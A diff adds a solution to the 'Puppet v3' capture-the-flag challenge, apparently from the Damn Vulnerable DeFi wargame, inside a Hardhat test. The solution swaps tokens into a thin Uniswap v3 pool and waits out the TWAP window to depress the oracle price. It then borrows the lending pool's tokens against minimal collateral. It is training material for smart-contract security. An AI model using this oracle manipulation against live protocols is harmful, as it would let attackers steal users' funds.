@@ -5,6 +5,7 @@ const { time, setBalance } = require("@nomicfoundation/hardhat-network-helpers")
 const positionManagerJson = require("@uniswap/v3-periphery/artifacts/contracts/NonfungiblePositionManager.sol/NonfungiblePositionManager.json");
 const factoryJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Factory.sol/UniswapV3Factory.json");
 const poolJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Pool.sol/UniswapV3Pool.json");
+require("dotenv").config();
 
 // See https://github.com/Uniswap/v3-periphery/blob/5bcdd9f67f9394f3159dad80d0dd01d37ca08c66/test/shared/encodePriceSqrt.ts
 const bn = require("bignumber.js");
@@ -26,7 +27,7 @@ describe('[Challenge] Puppet v3', function () {
     let initialBlockTimestamp;
 
     /** SET RPC URL HERE */
-    const MAINNET_FORKING_URL = "";
+    const MAINNET_FORKING_URL = process.env.MAINNET_FORKING_URL;
 
     // Initial liquidity amounts for Uniswap v3 pool
     const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
@@ -140,6 +141,52 @@ describe('[Challenge] Puppet v3', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // There is not much liquidity on Uniswap
+        // We can sell all our tokens on Uniswap to manipulate the price
+        // Then we can borrow all the tokens from the lending pool with a small collateral
+        // Difference from V2 is that now the price is time averaged
+        // So we have to wait some time after selling the tokens
+
+        // WETH-token0="0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"
+        // DVT-token1="0xdF46e54aAadC1d55198A4a8b4674D7a4c927097A"
+        // Swap DVT for ETH - OneForZero
+        /** Step1: Deployment */
+        const hackPuppetV3Pool = await (await ethers.getContractFactory("HackPuppetV3Pool", player)).deploy(
+            token.address,
+            uniswapPool.address,
+            lendingPool.address,
+            weth.address
+        );
+        await token.connect(player).transfer(hackPuppetV3Pool.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        expect(await token.balanceOf(hackPuppetV3Pool.address)).to.be.eq(PLAYER_INITIAL_TOKEN_BALANCE);
+
+        /** Step2: Swapping with time increments */
+        await hackPuppetV3Pool.connect(player).callSwap(
+            ethers.utils.parseEther("109"),
+            { gasLimit: 5000000 }
+        )
+        // the uniswap pool should almost have no liquidity after the swap
+        expect((await uniswapPool.liquidity())).to.be.eq(0);
+        // due to TWAP, the quote has not been affected after the 1st swap
+        expect(
+            await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)
+        ).to.be.eq(LENDING_POOL_INITIAL_TOKEN_BALANCE * 3n);
+        // increment time with 100s
+        await time.increase(100);
+        // now the price should be affected
+        expect(
+            await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)
+        ).to.be.lt(LENDING_POOL_INITIAL_TOKEN_BALANCE * 3n);
+
+        /** Step3: Transfer Weth from hackPuppetV3Pool to player and borrow from pool */
+        await hackPuppetV3Pool.connect(player).transferWeth();
+        // now we can borrow from pool
+        await weth.connect(player).approve(
+            lendingPool.address, 
+            await weth.balanceOf(player.address)
+        );
+        await lendingPool.connect(player).borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
